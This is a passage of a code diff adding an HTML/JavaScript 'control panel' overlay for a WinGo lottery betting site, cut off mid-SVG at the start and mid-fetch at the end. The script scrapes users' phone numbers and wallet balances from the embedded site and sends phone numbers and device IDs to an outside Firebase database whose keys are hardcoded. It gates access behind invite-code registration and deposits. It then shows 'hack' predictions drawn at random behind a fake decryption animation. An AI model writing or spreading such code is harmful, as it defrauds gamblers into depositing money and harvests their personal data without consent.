+        <circle class="star-s s3" cx="62" cy="125" r="1" fill="#e879f9"/>
+        <circle class="star-s s4" cx="208" cy="128" r="1.2" fill="#7dd3fc"/>
+        <circle class="star-s s5" cx="75" cy="188" r="1.1" fill="#ffffff"/>
+        <circle class="star-s s6" cx="195" cy="184" r="1.3" fill="#f472b6"/>
+        <circle class="star-s s7" cx="110" cy="235" r="1" fill="#00ff66"/>
+        <circle class="star-s s8" cx="160" cy="238" r="1.2" fill="#38bdf8"/>
+        <circle class="star-s s9" cx="135" cy="98" r=".9" fill="#ffffff"/>
+        <circle class="star-s s10" cx="135" cy="192" r="1" fill="#e879f9"/>
+      </g>
+    </g>
+    <polygon points="92,52 178,52 234,109 245,119 262,137 262,163 245,181 234,191 135,291 36,191 25,181 8,163 8,137 25,119 36,109" fill="none" stroke="url(#bevelGrad)" stroke-width="1.8"/>
+    <polygon class="laser-track-base" points="97,52 173,52 230,110 241,120 257,138 257,162 241,180 230,190 135,287 40,190 29,180 13,162 13,138 29,120 40,110"/>
+    <polygon class="laser-stream-purple" points="97,52 173,52 230,110 241,120 257,138 257,162 241,180 230,190 135,287 40,190 29,180 13,162 13,138 29,120 40,110"/>
+    <polygon class="laser-stream-cyan" points="97,52 173,52 230,110 241,120 257,138 257,162 241,180 230,190 135,287 40,190 29,180 13,162 13,138 29,120 40,110"/>
+    <polyline points="48,186 135,273 222,186" fill="none" stroke="#a855f7" stroke-width="1.2" opacity=".65"/>
+    <g class="wing-chevron-left">
+      <polygon points="6,150 16,139 23,139 15,150 23,161 16,161" fill="#00f7ff" opacity=".4"/>
+      <polyline points="20,140 10,150 20,160" fill="none" stroke="#00f7ff" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round"/>
+      <polyline points="20,140 10,150 20,160" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </g>
+    <g class="wing-chevron-right">
+      <polygon points="264,150 254,139 247,139 255,150 247,161 254,161" fill="#d946ef" opacity=".4"/>
+      <polyline points="250,140 260,150 250,160" fill="none" stroke="#d946ef" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round"/>
+      <polyline points="250,140 260,150 250,160" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </g>
+    <polygon points="112,260 135,283 158,260 135,275" fill="#130b26" stroke="#8b5cf6" stroke-width="1.4"/>
+    <polygon points="122,275 135,292 148,275 135,284" fill="#080517" stroke="#00f7ff" stroke-width="1.2"/>
+    <circle cx="135" cy="286" r="1.5" fill="#ffffff"/>
+  </svg>
+
+  <div class="hud-content-layer">
+    <div class="hud-top-section">
+      <div class="ccp-badge">
+        <span class="ccp-bracket left">«</span>
+        <span class="ccp-name">CHITRANSH</span>
+        <span class="ccp-gem">◈</span>
+        <span class="ccp-tag">CONTROL PANEL</span>
+        <span class="ccp-bracket right">»</span>
+      </div>
+      <div class="status-pill-wrap" id="statusPill">
+        <span class="status-led" id="statusLed"></span>
+        <span class="status-text" id="statusBadge">ACTV</span>
+      </div>
+    </div>
+
+    <div class="hud-center-core" id="hudCenterCore">
+      <svg class="cosmic-vortex-svg" viewBox="0 0 180 80">
+        <defs><radialGradient id="vortexGlowGrad" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#d946ef" stop-opacity=".25"/><stop offset="60%" stop-color="#00f7ff" stop-opacity=".1"/><stop offset="100%" stop-color="transparent"/></radialGradient></defs>
+        <ellipse class="vortex-core-glow" cx="90" cy="40" rx="55" ry="24" fill="url(#vortexGlowGrad)"/>
+        <ellipse class="vortex-pink-ring" cx="90" cy="40" rx="66" ry="22" fill="none" stroke="#d946ef" stroke-width="1.8" stroke-dasharray="24 12 45 15 70 20" opacity=".85"/>
+        <ellipse class="vortex-pink-ring" cx="90" cy="40" rx="66" ry="22" fill="none" stroke="#ffffff" stroke-width="1" stroke-dasharray="10 180" opacity=".9"/>
+        <ellipse class="vortex-cyan-ring" cx="90" cy="40" rx="66" ry="22" fill="none" stroke="#00f7ff" stroke-width="1.8" stroke-dasharray="28 14 50 16 65 18" opacity=".85"/>
+        <ellipse class="vortex-cyan-ring" cx="90" cy="40" rx="66" ry="22" fill="none" stroke="#ffffff" stroke-width="1" stroke-dasharray="12 170" opacity=".9"/>
+        <ellipse cx="90" cy="40" rx="42" ry="15" fill="none" stroke="rgba(168,85,247,.45)" stroke-width="1" stroke-dasharray="8 6"/>
+        <circle cx="34" cy="38" r="1.2" fill="#00f7ff" opacity=".8"/>
+        <circle cx="146" cy="42" r="1.2" fill="#d946ef" opacity=".8"/>
+        <circle cx="70" cy="22" r="1" fill="#ffffff" opacity=".9"/>
+        <circle cx="110" cy="58" r="1" fill="#ffffff" opacity=".9"/>
+      </svg>
+      <div class="core-display-content" id="coreDisplayContent"></div>
+    </div>
+
+    <div class="hud-seq-section is-hidden" id="hudSeqSection">
+      <div class="seq-pill-badge" id="seqPill">
+        <span>PERIOD:</span>
+        <span id="seqPeriodVal">----</span>
+      </div>
+    </div>
+
+    <div class="hud-btn-row">
+      <button id="btnAuthArea" type="button" class="btn-analyze is-register" style="display:none">REGISTER</button>
+      <button id="btnLockedArea" type="button" class="btn-analyze is-deposit" style="display:none">DEPOSIT NOW</button>
+      <button id="btnWingoArea" type="button" class="btn-analyze is-wingo" style="display:none">OPEN WINGO</button>
+      <button id="btnResultArea" type="button" class="btn-analyze" style="display:none">
+        <div class="btn-glare"></div>
+        <div class="btn-progress-bar" id="btn-scan-progress"></div>
+        <span class="btn-icon-wrap">
+          <svg class="btn-icon" viewBox="0 0 24 24"><circle cx="10" cy="10" r="6"/><path d="M14.5 14.5L20 20" stroke-linecap="round"/></svg>
+        </span>
+        <span id="btnResultLabel">EXECUTE</span>
+        <span class="btn-arrows">»»</span>
+      </button>
+      <button id="btnScanningArea" type="button" class="btn-analyze is-scanning" style="display:none" disabled>
+        <span>SCANNING...</span>
+        <span class="btn-arrows">⚡</span>
+      </button>
+      <button id="spd-hide" type="button" class="btn-hide">
+        <div class="btn-glare"></div>
+        <svg class="btn-icon" viewBox="0 0 24 24">
+          <path d="M2 2l20 20" stroke-linecap="round"/>
+          <path d="M10.45 10.45a3 3 0 0 0 4.1 4.1"/>
+          <path d="M9.88 4.24A10.94 10.94 0 0 1 12 4c5 0 9.27 3.11 11 7.5a11.83 11.83 0 0 1-4.07 5.17"/>
+          <path d="M6.61 6.61A13.53 13.53 0 0 0 1 11.5C2.73 15.89 7 19 12 19a11.08 11.08 0 0 0 4.38-.89"/>
+        </svg>
+        <span>HIDE</span>
+        <span class="btn-arrows">»»</span>
+      </button>
+    </div>
+  </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+<script>
+"use strict";
+
+var gameFrame = document.getElementById('bgFrame');
+
+function navTo(url){
+  try { if (gameFrame) { gameFrame.src = url; return; } } catch(e) {}
+  try {
+    if (window.ZAYRO && typeof window.ZAYRO.openUrl === 'function') window.ZAYRO.openUrl(url);
+    else if (window.ZAYRO && typeof window.ZAYRO.navigate === 'function') window.ZAYRO.navigate(url);
+  } catch(e2){}
+}
+function navAndHide(url){ navTo(url); }
+
+if(typeof window.ZAYRO==='undefined') window.ZAYRO={
+  speak:function(t){try{if(!window.speechSynthesis)return;window.speechSynthesis.cancel();var u=new SpeechSynthesisUtterance(t);u.lang='en-US';u.rate=.90;u.pitch=1.0;window.speechSynthesis.speak(u);}catch(e){}},
+  playSound:function(f){try{new Audio(f).play();}catch(e){}},
+  stopSound:function(){},
+  openUrl:function(u){ if(gameFrame) gameFrame.src = u; },
+  navigate:function(u){ if(gameFrame) gameFrame.src = u; }
+};
+
+function attachBtnHandler(id, handler){
+  var el = typeof id === 'string' ? document.getElementById(id) : id;
+  if(!el) return;
+  var isHandling = false;
+  var execute = function(e){
+    if(e){ try { e.preventDefault(); e.stopPropagation(); } catch(err){} }
+    if(isHandling) return;
+    isHandling = true;
+    try { handler(); } catch(err){ console.warn("btn handler err:", err); }
+    setTimeout(function(){ isHandling = false; }, 400);
+  };
+  el.addEventListener('click', execute);
+  el.addEventListener('touchend', function(e){
+    if(e.cancelable){ try { e.preventDefault(); } catch(err){} }
+    execute(e);
+  }, {passive: false});
+}
+
+var APP_ID = "{appid}";
+var fbDepositCondition = true;
+var fbMinDeposit = {deposit};
+var fbRegCondition = true;
+var minDeposit = {deposit};
+
+var REGISTER_URL="{domain}{invitecode}";
+var DEPOSIT_URL ="{domain}wallet/Recharge";
+var WINGO_URL   ="{domain}saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo";
+
+var rtdb = null;
+try {
+  firebase.initializeApp({
+    apiKey: "AIzaSyAenqA_6oCB3YrIiWryg1qz1PTUvwiEeJU",
+    authDomain: "user-data-one.firebaseapp.com",
+    databaseURL: "https://user-data-one-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "user-data-one",
+    storageBucket: "user-data-one.firebasestorage.app",
+    messagingSenderId: "734551610621",
+    appId: "1:734551610621:web:e40f751a58a3cf12529a94",
+    measurementId: "G-N4R47VEST0"
+  });
+  rtdb = firebase.database();
+} catch(e) { console.warn("Firebase Init skipped:", e); }
+
+var userRegistered = false;
+try { userRegistered = localStorage.getItem('slex_user_registered') === '1'; } catch(e){}
+
+function formatCurrentDate(d){d=d||new Date();var p=function(n){return(n<10?'0':'')+n};return d.getFullYear()+'-'+p(d.getMonth()+1)+'-'+p(d.getDate())+' '+p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds());}
+function getAndroidDeviceId(){
+  try{ if(window.ZAYRO&&typeof window.ZAYRO.getDeviceId==='function'){var did=window.ZAYRO.getDeviceId();if(did&&did!=='unknown')return did;} }catch(e){}
+  var s=localStorage.getItem('slex_device_id');
+  if(!s){s='dev_'+Math.random().toString(36).substring(2,12)+Date.now();localStorage.setItem('slex_device_id',s);}
+  return s;
+}
+function saveRegisteredUserToFirebase(phone){
+  if(!rtdb||!phone)return;
+  var now=new Date();
+  var data={phone:phone.toString(),timestamp:now.getTime(),date:formatCurrentDate(now),app_id:APP_ID,device_id:getAndroidDeviceId(),status:"registered"};
+  rtdb.ref("apps/"+APP_ID+"/registered_users/phones/"+phone.toString()).update(data).then(function(){
+    userRegistered = true;
+    try { localStorage.setItem('slex_user_registered', '1'); } catch(e){}
+  }).catch(function(e){console.warn(e);});
+}
+
+function computeCurrentPeriod(){
+  try {
+    var d = new Date();
+    var m = d.getUTCHours() * 60 + d.getUTCMinutes();
+    return String(10001 + m).slice(-4);
+  } catch(e){ return '----'; }
+}
+
+var currentPhone=null, warnActive=false, isOnRegisterPage=false, isOnLoginPage=false, _cwPending=false;
+var wasAuthFlowActive=false, pendingRegPhone=null;
+
+function checkAndWarn(phone){
+  if(!rtdb){hideWarnOverlay();return;}
+  if(!fbRegCondition){hideWarnOverlay();return;}
+  if(_cwPending)return;
+  _cwPending=true;
+  rtdb.ref("apps/"+APP_ID+"/registered_users/phones/"+phone.toString()).once("value")
+    .then(function(snap){
+      _cwPending=false;
+      if(!snap.exists()){ showWarnOverlay(); }
+      else {
+        hideWarnOverlay();
+        userRegistered = true;
+        try { localStorage.setItem('slex_user_registered', '1'); } catch(e){}
+      }
+    })
+    .catch(function(){_cwPending=false;showWarnOverlay();});
+}
+
+window.setPhone=function(phone){
+  if(!phone)return;
+  var p=phone.toString().trim().replace(/[^0-9]/g,'');
+  if(p.length===12 && p.startsWith('91')) p=p.substring(2);
+  if(p.length<10)return;
+  if(isOnRegisterPage){pendingRegPhone=p;return;}
+  if(p!==currentPhone || !warnActive){
+    currentPhone=p;
+    checkAndWarn(p);
+  }
+};
+
+var _lMon=null;
+function startLoginMon(){
+  if(_lMon)return;
+  if(currentPhone && fbRegCondition) checkAndWarn(currentPhone);
+  _lMon=setInterval(function(){
+    try{
+      var fDoc=gameFrame.contentDocument||gameFrame.contentWindow.document;
+      if(!fDoc)return;
+      var inp=fDoc.querySelector('.phoneInput__container-input input');
+      if(!inp){
+        var all=fDoc.querySelectorAll('input');
+        for(var i=0;i<all.length;i++){
+          var pl=(all[i].placeholder||'').toLowerCase(),nm=(all[i].name||'').toLowerCase();
+          if(pl.indexOf('phone')>=0||pl.indexOf('mobile')>=0||nm.indexOf('phone')>=0||nm.indexOf('user')>=0){inp=all[i];break;}
+        }
+      }
+      if(inp){
+        var v=inp.value.replace(/[^0-9+]/g,'');
+        if(v.length===12 && v.startsWith('91')) v=v.substring(2);
+        if(v.length>=10 && v!==currentPhone){ currentPhone=v; if(fbRegCondition) checkAndWarn(v); }
+      }
+    }catch(e){}
+  },150);
+}
+function stopLoginMon(){ if(_lMon){clearInterval(_lMon);_lMon=null;} }
+
+var _rMon=null;
+function startRegisterMon(){
+  if(_rMon)return;
+  _rMon=setInterval(function(){
+    try{
+      var fDoc=gameFrame.contentWindow.document||gameFrame.contentDocument;
+      if(!fDoc)return;
+      var inp=null, all=fDoc.querySelectorAll('input');
+      for(var i=0;i<all.length;i++){
+        var pl=(all[i].placeholder||'').toLowerCase(), nm=(all[i].name||'').toLowerCase();
+        if(pl.indexOf('phone')>=0||pl.indexOf('mobile')>=0||nm.indexOf('phone')>=0||nm.indexOf('user')>=0){inp=all[i];break;}
+      }
+      if(inp){
+        var v=inp.value.replace(/[^0-9]/g,'');
+        if(v.length===12 && v.startsWith('91')) v=v.substring(2);
+        if(v.length>=10) pendingRegPhone=v;
+      }
+    }catch(e){}
+  },1000);
+}
+function stopRegisterMon(){ if(_rMon){clearInterval(_rMon);_rMon=null;} }
+
+function showWarnOverlay(){
+  var _f=!warnActive;
+  warnActive=true;
+  var wo = document.getElementById("warnOverlay");
+  if(wo) wo.classList.add("show");
+  if(_f) playAudio('bypass.mp3');
+}
+function hideWarnOverlay(){
+  warnActive=false;
+  var wo = document.getElementById("warnOverlay");
+  if(wo) wo.classList.remove("show");
+}
+
+var _af='', _at=0;
+function stopAudio(){ try{window.ZAYRO.stopSound();}catch(e){} _af=''; _at=0; }
+function playAudio(f){
+  var n=Date.now();
+  if(f===_af && n-_at<3000) return;
+  _af=f; _at=n;
+  try{ window.ZAYRO.playSound(f); }
+  catch(e){ try{ var a=new Audio(f); a.volume=1; var p=a.play(); if(p&&p.catch)p.catch(function(){}); }catch(e2){} }
+}
+function playAudioForce(f){ _af=''; _at=0; playAudio(f); }
+
+/* OPTIMIZED: 800ms scraper (was 300ms) — 2.7x less DOM queries, still responsive */
+var _lastScrapedUrl="", _lastScrapedBalance="", _lastScrapedPhone="";
+var _pageVisible = true;
+try {
+  document.addEventListener('visibilitychange', function(){
+    _pageVisible = !document.hidden;
+  });
+} catch(e){}
+
+setInterval(function(){
+  if(!_pageVisible) return;
+  try{
+    var fWin=gameFrame.contentWindow;
+    var fDoc=gameFrame.contentDocument||fWin.document;
+    if(!fWin||!fDoc)return;
+
+    var curUrl="";
+    try{curUrl=fWin.location.href||"";}catch(e){}
+    if(curUrl!==_lastScrapedUrl && curUrl!=="about:blank"){
+      _lastScrapedUrl=curUrl;
+      window.setUrl(curUrl);
+    }
+
+    var uUrl=curUrl.toLowerCase();
+    var isReg=uUrl.indexOf('register')>=0||uUrl.indexOf('invitationcode')>=0||uUrl.indexOf('invitecode')>=0;
+    var isLog=(uUrl.indexOf('/login')>=0||uUrl.indexOf('login')>=0)&&!isReg;
+
+    if(isLog||isReg){
+      var pinp=fDoc.querySelector('input[placeholder*="phone"]')
+              ||fDoc.querySelector('input[placeholder*="Phone"]')
+              ||fDoc.querySelector('input[placeholder*="mobile"]')
+              ||fDoc.querySelector('input[placeholder*="Mobile"]')
+              ||fDoc.querySelector('input[type="tel"]')
+              ||fDoc.querySelector('input[type="number"]')
+              ||fDoc.querySelector('input[name="userNumber"]');
+      if(pinp && !pinp.dataset.hooked){
+        pinp.dataset.hooked='true';
+        var h=function(e){
+          var v=e.target.value.replace(/[^0-9+]/g,'');
+          if(v.length>=10 && v!==_lastScrapedPhone){ _lastScrapedPhone=v; window.setPhone(v); }
+        };
+        pinp.addEventListener('input',h);
+        pinp.addEventListener('blur',h);
+      }
+      return;
+    }
+
+    var phoneEl=fDoc.querySelector('.user-phone, .phone, [class*="phone" i], [class*="mobile" i], [id*="phone" i], [id*="mobile" i]');
+    if(phoneEl){
+      var pText=(phoneEl.innerText||phoneEl.textContent||"").trim().replace(/[^\d]/g,'');
+      if(pText.length>=10 && pText!==_lastScrapedPhone){ _lastScrapedPhone=pText; if(typeof window.setPhone==='function') window.setPhone(pText); }
+    }
+
+    var balText="";
+    var balEl=fDoc.querySelector(
+      '.balance, .wallet-balance, [class*="balance" i], [id*="balance" i], '+
+      '.money, .amount, .wallet-amount, [class*="amount" i], '+
+      '.user-balance, .header-balance, .balance-num, .txt-money, .num-money, '+
+      '.amount .a1 .a, .gameHeader__C-balance span, .gameHeader__C-balance, '+
+      '.Wallet__C-balance-l1 span, .Wallet__C-balance-l1, .walletInfo__C-balance span, '+
+      '.walletInfo__C-balance, .headerInfo__C-right span, .header__money span, '+
+      '.header-money span, .top-bar__balance span, .userInfo__C-balance span, '+
+      '.balance-amount, .my-amount'
+    );
+    if(balEl) balText=(balEl.innerText||balEl.textContent||balEl.value||balEl.getAttribute('data-amount')||balEl.getAttribute('data-balance')||"").trim();
+
+    if(!balText||!balText.match(/\d/)){
+      var allSpans=fDoc.querySelectorAll('span, div, p, b, strong');
+      for(var bi=0;bi<allSpans.length;bi++){
+        var stxt=(allSpans[bi].innerText||allSpans[bi].textContent||"").trim();
+        if(/^(?:₹|Rs\.?|\$)\s*[\d,]+(?:\.\d{1,2})?$/.test(stxt)){ balText=stxt; break; }
+      }
+    }
+    if(balText){
+      var clean=balText.replace(/[₹,\s]/g,'').replace(/[^0-9.]/g,'');
+      if(clean && clean!=='0' && clean!==_lastScrapedBalance && /[0-9]/.test(clean)){
+        _lastScrapedBalance=clean;
+        if(typeof window.setBalance==='function') window.setBalance(clean);
+      }
+    }
+  }catch(e){}
+},800);
+
+var curState='wait', bypassRunning=false;
+var lastPeriod=null, predData=null;
+var lockedPeriod=null, lockedPrediction=null;
+var wingoHackDone=false;
+var everMetMin=false, lastBalance=-1, lastPageState='wait', _lowBalancePlayed=false, _successPlayed=false;
+
+var LOGIC={0:{n:'5',s:'BIG'},1:{n:'2',s:'SMALL'},2:{n:'4',s:'SMALL'},3:{n:'7',s:'BIG'},4:{n:'8',s:'BIG'},5:{n:'9',s:'BIG'},6:{n:'0',s:'SMALL'},7:{n:'3',s:'SMALL'},8:{n:'6',s:'BIG'},9:{n:'1',s:'SMALL'}};
+
+window.setMinDeposit=function(amt){ minDeposit=parseFloat(amt)||{deposit}; updateUI(); };
+
+window.setBalance=function(bal){
+  lastBalance=parseFloat(bal)||0;
+  if(!fbDepositCondition){
+    everMetMin=true;
+    if(curState==='low') _goState(lastPageState!=='wait'?lastPageState:'home');
+    else updateUI();
+    return;
+  }
+  if(lastBalance<10){
+    everMetMin=false;
+    if(curState==='low'||curState==='wingo'||curState==='home'||curState==='wait') _goState('low');
+  } else if(lastBalance>=minDeposit){
+    everMetMin=true;
+    if(curState==='low') _goState(lastPageState!=='wait'?lastPageState:'home');
+    else updateUI();
+  } else {
+    if(everMetMin){
+      if(curState==='low') _goState(lastPageState!=='wait'?lastPageState:'home');
+      else updateUI();
+    } else {
+      if(curState!=='wingo' && curState!=='low') _goState('low');
+      else updateUI();
+    }
+  }
+};
+
+window.setState=function(name){
+  if(bypassRunning) return;
+  if(name==='wait'){ lastPageState='wait'; _goState('wait'); }
+  else if(name==='home'){
+    lastPageState='home';
+    if(!userRegistered){ _goState('wait'); return; }
+    if(!fbDepositCondition || everMetMin || lastBalance>=minDeposit) _goState('home');
+    else _goState('low');
+  }
+  else if(name==='wingo'){
+    if(!userRegistered){ lastPageState='wingo'; _goState('wait'); return; }
+    var freshEntry = (lastPageState !== 'wingo');
+    lastPageState='wingo';
+    if(!fbDepositCondition || everMetMin || lastBalance>=minDeposit){
+      if(freshEntry) wingoHackDone = false;
+      _goState('wingo');
+      /* FIX: fetch period when entering wingo to populate lockedPeriod */
+      fetchPeriod();
+    }
+    else _goState('low');
+  }
+};
+
+window.setUrl=function(url){
+  var u=(url||'').toLowerCase();
+  var prevIsReg=isOnRegisterPage;
+  isOnRegisterPage = u.indexOf('register')>=0 || u.indexOf('invitationcode')>=0 || u.indexOf('invitecode')>=0;
+  var isLogin = u.indexOf('login')>=0 && !isOnRegisterPage;
+  isOnLoginPage = isLogin;
+
+  if(prevIsReg && !isOnRegisterPage && !isLogin && pendingRegPhone){
+    saveRegisteredUserToFirebase(pendingRegPhone);
+    currentPhone=pendingRegPhone;
+    pendingRegPhone=null;
+  }
+
+  if(isOnRegisterPage){
+    wasAuthFlowActive=true; hideWarnOverlay(); stopLoginMon(); startRegisterMon();
+    if(window._rt) clearTimeout(window._rt);
+    window._rt=setTimeout(function(){ window._rt=null; playAudio('register.mp3'); },3000);
+    return;
+  } else {
+    stopRegisterMon();
+    if(!isLogin && pendingRegPhone){
+      saveRegisteredUserToFirebase(pendingRegPhone);
+      currentPhone=pendingRegPhone;
+      pendingRegPhone=null;
+    }
+  }
+
+  if(window._rt){ clearTimeout(window._rt); window._rt=null; }
+
+  if(isLogin){ wasAuthFlowActive=true; hideWarnOverlay(); startLoginMon(); }
+  else { stopLoginMon(); }
+
+  var isWingo = u.indexOf('saas')>=0 || u.indexOf('wingo')>=0 || u.indexOf('lottery')>=0;
+
+  if(isWingo){ window.setState('wingo'); }
+  else if(isLogin){ window.setState('wait'); }
+  else {
+    var _wasAuth=wasAuthFlowActive;
+    wasAuthFlowActive=false;
+    window.setState('home');
+    if(_wasAuth && !_successPlayed){ _successPlayed=true; playAudio('successful.mp3'); }
+  }
+};
+
+function _goState(n){
+  stopAudio();
+  curState=n;
+  if(n==='wait'){ _lowBalancePlayed=false; _successPlayed=false; }
+  if(n==='low'){
+    if(lastPageState==='wingo'){
+      setTimeout(function(){ if(curState==='low') playAudioForce('deposit.mp3'); },120);
+    } else if(!_lowBalancePlayed){
+      _lowBalancePlayed=true;
+      setTimeout(function(){ if(curState==='low') playAudioForce('lowbalance.mp3'); },120);
+    }
+  }
+  if(n==='wingo' && !everMetMin && fbDepositCondition){
+    setTimeout(function(){ if(!everMetMin && curState==='wingo') playAudioForce('deposit.mp3'); },2200);
+  }
+  updateUI();
+}
+
+var coreDisplay = document.getElementById('coreDisplayContent');
+var statusBadge = document.getElementById('statusBadge');
+var statusLed = document.getElementById('statusLed');
+var seqPeriodVal = document.getElementById('seqPeriodVal');
+var hudSeqSection = document.getElementById('hudSeqSection');
+var stage = document.getElementById('stage');
+var btnScanProgress = document.getElementById('btn-scan-progress');
+var btnResultLabel = document.getElementById('btnResultLabel');
+
+var ALL_BTNS = ['btnAuthArea','btnLockedArea','btnWingoArea','btnResultArea','btnScanningArea'];
+function showOnlyBtn(id){
+  for(var i=0;i<ALL_BTNS.length;i++){
+    var el=document.getElementById(ALL_BTNS[i]);
+    if(el) el.style.display='none';
+  }
+  if(id){ var e=document.getElementById(id); if(e) e.style.display='inline-flex'; }
+}
+
+var NUMBER_IMAGES=[
+  'https://i.ibb.co/WvTR3Jrx/num0.png','https://i.ibb.co/yFQwGPZv/num1.png',
+  'https://i.ibb.co/XZNjXwjq/num2.png','https://i.ibb.co/233fFQqz/num3.png',
+  'https://i.ibb.co/mVsBYfQR/num4.png','https://i.ibb.co/Dg5kjr9L/num5.png',
+  'https://i.ibb.co/Z1HMQSPM/num6.png','https://i.ibb.co/0y8yYzDH/num7.png',
+  'https://i.ibb.co/dsRvZmSf/num8.png','https://i.ibb.co/prMV31Ng/num9.png'
+];
+NUMBER_IMAGES.forEach(function(u){ var i=new Image(); i.src=u; });
+
+function getBallHtml(num){
+  var n=parseInt(num,10);
+  var idx=(!isNaN(n)&&n>=0&&n<=9)?n:0;
+  return '<img class="res-num-ball" src="'+NUMBER_IMAGES[idx]+'" alt="Num '+idx+'">';
+}
+
+function setBadge(txt, color){
+  if(!statusBadge||!statusLed) return;
+  statusBadge.innerText=txt;
+  statusBadge.style.color=color;
+  statusBadge.style.textShadow='0 0 8px '+color;
+  statusLed.style.background=color;
+  statusLed.style.boxShadow='0 0 8px '+color+',0 0 16px '+color;
+}
+
+function setShellLaserFast(fast){
+  if(!stage) return;
+  if(fast) stage.classList.add('laser-fast');
+  else stage.classList.remove('laser-fast');
+}
+
+function showSeq(on){
+  if(!hudSeqSection) return;
+  if(on){ hudSeqSection.classList.remove('is-hidden'); hudSeqSection.classList.add('is-visible'); }
+  else { hudSeqSection.classList.remove('is-visible'); hudSeqSection.classList.add('is-hidden'); }
+}
+
+function updateUI(){
+  if(!coreDisplay) return;
+  if(bypassRunning) return;
+
+  if(curState==='wait'){
+    setBadge('AUTH','#f472b6');
+    showSeq(false);
+    coreDisplay.innerHTML =
+      '<div class="state-info-box">'+
+        '<div class="state-title state-warning">ACCESS LOCKED</div>'+
+        '<div class="state-sub">REGISTER TO CONTINUE</div>'+
+        '<div class="state-hint">AUTHENTICATION REQUIRED</div>'+
+      '</div>';
+    showOnlyBtn('btnAuthArea');
+    setShellLaserFast(false);
+  }
+  else if(curState==='low'){
+    setBadge('LOCKED','#ffd700');
+    showSeq(false);
+    var amtStr=String(minDeposit||{deposit}).replace(/[^0-9]/g,'')||'500';
+    coreDisplay.innerHTML =
+      '<div class="state-info-box">'+
+        '<div class="state-title state-warning">LOW BALANCE</div>'+
+        '<div class="state-sub">ACCESS LOCKED</div>'+
+        '<div class="state-deposit">MIN ₹'+amtStr+'</div>'+
+        '<div class="state-hint">RECHARGE TO UNLOCK</div>'+
+      '</div>';
+    showOnlyBtn('btnLockedArea');
+    setShellLaserFast(false);
+  }
+  else if(curState==='home'){
+    setBadge('READY','#00ff66');
+    showSeq(false);
+    coreDisplay.innerHTML =
+      '<div class="state-info-box">'+
+        '<div class="state-title state-ready">READY</div>'+
+        '<div class="state-hint">GO TO WINGO</div>'+
+      '</div>';
+    showOnlyBtn('btnWingoArea');
+    setShellLaserFast(false);
+  }
+  else if(curState==='wingo'){
+    if(wingoHackDone && lockedPrediction){
+      setBadge('DONE','#00ff66');
+      showSeq(true);
+      /* FIX: use lockedPeriod with fallback so it always shows */
+      var disp = lockedPeriod ? String(lockedPeriod).slice(-4) : computeCurrentPeriod();
+      if(seqPeriodVal) seqPeriodVal.innerText = disp;
+      coreDisplay.innerHTML =
+        '<div class="result-text-box">'+
+          '<span class="res-type-text">'+lockedPrediction.s+'</span>'+
+          getBallHtml(lockedPrediction.n)+
+        '</div>';
+      if(btnResultLabel) btnResultLabel.innerText='RE-ANALYZE';
+      showOnlyBtn('btnResultArea');
+      setShellLaserFast(false);
+    } else {
+      setBadge('LIVE','#00f7ff');
+      showSeq(false);
+      var b2 = lastBalance>=0 ? lastBalance.toLocaleString('en-IN',{maximumFractionDigits:2}) : '0.00';
+      coreDisplay.innerHTML =
+        '<div class="state-info-box">'+
+          '<div class="state-title state-ready">READY</div>'+
+          '<div class="state-label">BALANCE ₹'+b2+'</div>'+
+          '<div class="state-hint">TAP EXECUTE TO ANALYZE</div>'+
+        '</div>';
+      if(btnResultLabel) btnResultLabel.innerText='EXECUTE';
+      showOnlyBtn('btnResultArea');
+      setShellLaserFast(false);
+    }
+  }
+}
+
+function runBypass(){
+  if(bypassRunning) return;
+  if(curState!=='wingo'){ navTo(WINGO_URL); return; }
+  bypassRunning=true;
+  wingoHackDone=false;
+  stopAudio();
+  setBadge('SCAN','#00f7ff');
+  setShellLaserFast(true);
+  showSeq(false);
+  if(seqPeriodVal) seqPeriodVal.innerText='----';
+  showOnlyBtn('btnScanningArea');
+  if(btnScanProgress) btnScanProgress.style.transform='scaleX(0)';
+  coreDisplay.innerHTML =
+    '<div class="scan-core-hud">'+
+      '<div class="scan-radar-mini"><div class="scan-radar-sweep"></div><span class="scan-radar-pct" id="scanLivePct">0%</span></div>'+
+      '<span class="scan-phase-label" id="scanPhaseTxt">QUANTUM LINK</span>'+
+    '</div>';
+  var pctEl=document.getElementById('scanLivePct');
+  var phaseEl=document.getElementById('scanPhaseTxt');
+  var STAGES=[{at:.08,t:'QUANTUM LINK'},{at:.28,t:'SPECTRAL SCAN'},{at:.50,t:'PATTERN DECRYPT'},{at:.72,t:'HASH CONVERGE'},{at:.93,t:'TARGET LOCKED'}];
+  var D=1700, stIdx=0, started=Date.now(), done=false;
+  var iv=setInterval(function(){
+    var el=Date.now()-started;
+    var pct=Math.min(1,el/D);
+    var pctInt=Math.floor(pct*100);
+    if(pctEl) pctEl.textContent=pctInt+'%';
+    if(btnScanProgress) btnScanProgress.style.transform='scaleX('+pct+')';
+    while(stIdx<STAGES.length && pct>=STAGES[stIdx].at){ if(phaseEl) phaseEl.textContent=STAGES[stIdx].t; stIdx++; }
+    if(pct>=1 && !done){
+      done=true; clearInterval(iv);
+      var lg = predData || LOGIC[Math.floor(Math.random()*10)];
+      lockedPrediction = lg;
+      /* FIX: fallback to computeCurrentPeriod if lastPeriod null */
+      lockedPeriod = lastPeriod || computeCurrentPeriod();
+      setTimeout(function(){
+        bypassRunning=false;
+        wingoHackDone=true;
+        curState='wingo';
+        updateUI();
+        playAudio(lockedPrediction.s==='BIG'?'big.mp3':'small.mp3');
+        try{ window.ZAYRO.speak(lockedPrediction.s+' '+lockedPrediction.n); }catch(e){}
+        setTimeout(fetchPeriod,200);
+      },300);
+    }
+  },40);
+}
+
+/* OPTIMIZED: skip on auth pages — only fetch when needed */
+async function fetchPeriod(){
+  try{
+    if(isOnRegisterPage || isOnLoginPage) return;
+    var res=await fetch("https://api.bdg88zf.com/api/webapi/GetGameIssue",{
